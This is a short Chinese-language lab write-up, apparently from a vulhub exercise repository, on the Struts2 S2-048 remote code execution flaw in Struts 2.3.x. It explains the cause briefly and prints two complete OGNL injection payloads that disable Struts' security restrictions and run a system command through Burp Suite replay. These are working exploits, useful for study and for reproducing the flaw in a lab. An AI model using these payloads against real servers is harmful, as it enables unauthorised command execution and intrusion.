# Struts2_048_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			在Struts 2.3.x 版本上的Showcase 插件ActionMessage类中，通过构建不可信的输入可实现远程命令攻击。漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接传递后处理不当导致任意代码执行。

​			影响版本

  		2.3.x

### 0x02漏洞复现

#### payload1(RCE)：

%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}

#### payload2(RCE)：

%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

​			**登录界面**

![S2_048_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_048_rce_1.jpg)

​			**payload1,id被执行**

![S2_048_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_048_rce_2.jpg)

​			**payload1,id被执行**

![S2_048_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_048_rce_3.jpg)



### 0x03参考资料

https://blog.csdn.net/qq_36374896/article/details/84145292
